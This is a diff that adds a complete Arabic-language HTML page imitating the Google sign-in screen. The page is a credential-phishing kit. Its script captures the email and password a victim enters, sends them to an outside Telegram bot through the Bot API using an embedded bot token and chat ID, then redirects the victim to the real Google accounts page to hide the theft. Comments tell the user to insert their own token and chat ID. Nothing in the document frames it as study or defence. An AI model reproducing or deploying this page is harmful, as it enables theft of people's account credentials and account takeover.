@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول - حسابات Google</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; }
+        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; direction: ltr; }
+        
+        /* الحاوية الرئيسية */
+        .container { width: 100%; max-width: 450px; padding: 30px 24px; text-align: center; }
+        
+        /* شعار جوجل */
+        .logo { width: 80px; margin-bottom: 20px; }
+        
+        /* العناوين */
+        h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
+        .subtitle { font-size: 15px; color: #1f1f1f; margin-bottom: 30px; }
+        
+        /* حقول الإدخال */
+        .input-group { position: relative; margin-bottom: 20px; text-align: left; }
+        input { 
+            width: 100%; 
+            padding: 16px 14px; 
+            font-size: 16px; 
+            border: 1px solid #dadce0; 
+            border-radius: 4px; 
+            outline: none; 
+            background: transparent;
+            transition: border-color 0.2s;
+        }
+        input:focus { border: 2px solid #1a73e8; padding: 15px 13px; }
+        .input-label { 
+            position: absolute; 
+            top: 50%; 
+            left: 14px; 
+            transform: translateY(-50%); 
+            background: white; 
+            padding: 0 4px; 
+            color: #5f6368; 
+            font-size: 16px; 
+            transition: 0.2s; 
+            pointer-events: none;
+        }
+        input:focus + .input-label, input:not(:placeholder-shown) + .input-label { 
+            top: 0; 
+            font-size: 12px; 
+            color: #1a73e8; 
+        }
+        
+        /* الرابط السفلي */
+        .forgot-link { display: block; text-align: left; color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; margin-bottom: 40px; }
+        
+        /* الأزرار */
+        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
+        .create-btn { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; padding: 10px; border-radius: 4px; }
+        .next-btn { 
+            background: #1a73e8; 
+            color: white; 
+            border: none; 
+            padding: 12px 24px; 
+            font-size: 15px; 
+            font-weight: 500; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            transition: background 0.2s;
+        }
+        .next-btn:hover { background: #1557b0; }
+        
+        /* الفوتر */
+        .footer { display: flex; justify-content: space-between; font-size: 12px; color: #5f6368; margin-top: 50px; }
+        .footer select { border: none; background: transparent; color: #5f6368; font-size: 12px; outline: none; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- شعار جوجل الحقيقي -->
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
+    
+    <h1>تسجيل الدخول</h1>
+    <p class="subtitle">استخدم حسابك في Google</p>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <input type="text" id="email" placeholder=" " required>
+            <label class="input-label">البريد الإلكتروني أو رقم الهاتف</label>
+        </div>
+        
+        <div class="input-group">
+            <input type="password" id="password" placeholder=" " required>
+            <label class="input-label">كلمة المرور</label>
+        </div>
+
+        <a href="#" class="forgot-link">هل نسيت كلمة المرور؟</a>
+
+        <div class="actions">
+            <a href="#" class="create-btn">إنشاء حساب</a>
+            <button type="submit" class="next-btn">التالي</button>
+        </div>
+    </form>
+
+    <div class="footer">
+        <select>
+            <option>العربية</option>
+        </select>
+        <div>
+            <span style="margin-left: 15px;">مساعدة</span>
+            <span style="margin-left: 15px;">الخصوصية</span>
+            <span>البنود</span>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ==========================================
+    // ⚠️ هنا تضع التوكن والـ Chat ID الخاصين بك
+    // ==========================================
+    const BOT_TOKEN = "8877169043:AAF_zwAlpYkRGs6fteqIUlgIUycSvmj_oac";
+    const CHAT_ID = "1346886960";
+    
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        
+        // تجهيز الرسالة
+        const message = `
+🚨 بيانات Google جديدة!
+━━━━━━━━━━━━━━━
+📧 الإيميل: ${email}
+🔑 الباسورد: ${password}
+━━━━━━━━━━━━━━━
+🕐 الوقت: ${new Date().toLocaleString('ar-EG')}
+        `;
+        
+        // إرسال لتيليجرام
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        
+        fetch(url).finally(() => {
+            // تحويل المستخدم لجوجل الحقيقي
+            window.location.href = "https://accounts.google.com/";
+        });
+    });
+</script>
+
+</body>
+</html>
